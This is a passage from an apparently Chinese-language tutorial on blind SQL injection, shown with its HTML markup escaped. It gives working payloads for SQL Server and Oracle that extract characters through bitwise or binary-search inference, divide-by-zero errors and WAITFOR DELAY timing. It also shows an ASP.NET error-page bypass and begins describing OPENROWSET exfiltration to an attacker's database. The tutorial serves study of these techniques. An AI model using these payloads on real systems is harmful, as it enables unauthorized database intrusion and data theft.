&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;J&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;J

&lt;span class=&#34;token comment&#34;&gt;#二分法&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#下面是相应的使用逐位方法的例子&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当ASP.NET应用程序使用web.config配置文件的＜customError＞标记定义的出错页面(error page)来捕获未处理的异常时，可以添加或修改 aspxerrorpage参数，使其指向一个并不存在的页面，这样就可以旁路(bypass)出错页面。因此，如果下面的请求在功能上重定向到一个用户自定义的出错页面，请求常常会泄漏它所捕获的底层错误:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;count_reviews&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;aspx?review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;MadBob&#39;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;aspxerrorpath&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;foo&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;语法上不能存在错误，因为这会导致在执行查询之前总是失败，只 能通过某些条件来引发查询失败。可通过结合使用除数为0的子句和CASE条件来实现该目的:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; CAST &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle响应技术&#34;&gt;&lt;a href=&#34;#Oracle响应技术&#34; class=&#34;headerlink&#34; title=&#34;Oracle响应技术&#34;&gt;&lt;/a&gt;Oracle响应技术&lt;/h4&gt;&lt;p&gt;结构和上述数据库相似，依赖的函数不同&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; SYS_CONTEXT&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;USE RENV&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ISDBA&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TRUE&#39;&lt;/span&gt;；
&lt;span class=&#34;token comment&#34;&gt;#逐位推断，根据第二个注入谓词是否返回结果来测试状态：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; BITAND&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j
&lt;span class=&#34;token comment&#34;&gt;#二分搜索&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k
&lt;span class=&#34;token comment&#34;&gt;#使用Oracle的字符串连接技术来确保在函数或过程参数列表中安全地使用,该技术使用连接和CASE语句将利用重写为拆分与平衡过的字符串&lt;/span&gt;
Mad&lt;span class=&#34;token string&#34;&gt;&#39;||(SELECT CASE WHEN (ASCII(SUBSTR((...),i,1))&amp;gt;k THEN &#39;&lt;/span&gt;Bob&lt;span class=&#34;token string&#34;&gt;&#39; ELSE &#39;&#39; END FROM DUAL)||&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#上述代码只有在推断测试返回真时才会产生完整的MadBob字符串&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#使用除数为0子句来产生运行时错误，这与SQL Server中的操作相似&lt;/span&gt;
MadBob&lt;span class=&#34;token string&#34;&gt;&#39;||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((...),i,1))2^j)=2^j THEN CAST(1/0 AS CHAR) ELSE &#39;&#39; END FROM DUAL)||&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;返回多位信息&#34;&gt;&lt;a href=&#34;#返回多位信息&#34; class=&#34;headerlink&#34; title=&#34;返回多位信息&#34;&gt;&lt;/a&gt;返回多位信息&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#逐位&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:00&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:05&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:10&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:15&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#二分&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:05&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;k
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:00&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;使用非主流通道&#34;&gt;&lt;a href=&#34;#使用非主流通道&#34; class=&#34;headerlink&#34; title=&#34;使用非主流通道&#34;&gt;&lt;/a&gt;使用非主流通道&lt;/h3&gt;&lt;p&gt;数据库连接、DNS、e-mail和HTTP&lt;/p&gt;
&lt;h4 id=&#34;数据库连接&#34;&gt;&lt;a href=&#34;#数据库连接&#34; class=&#34;headerlink&#34; title=&#34;数据库连接&#34;&gt;&lt;/a&gt;数据库连接&lt;/h4&gt;&lt;p&gt;针对mssql，攻击者可通过通道来创建从受害者数据库到攻击者数据库的连接，并通过该连接传递查询的数据。可使用OPENROWSET命令实现该目的，要想攻击成功，攻击者必须能够在受害者数据库上打开一条通向攻击者数据库的TCP(传输控制协议)连接，默认使用的是1433端口。如果受害者机器上配有出口过滤功能，或者攻击者正在执行出口过滤，那么连接就会失败。只需修改目的IP地址后面的端口号即可连接到其他端口。&lt;/p&gt;
&lt;p&gt;示例：连接到地址为10.0.2.2的mssql用户sa并执行SQL语句&lt;/p&gt;
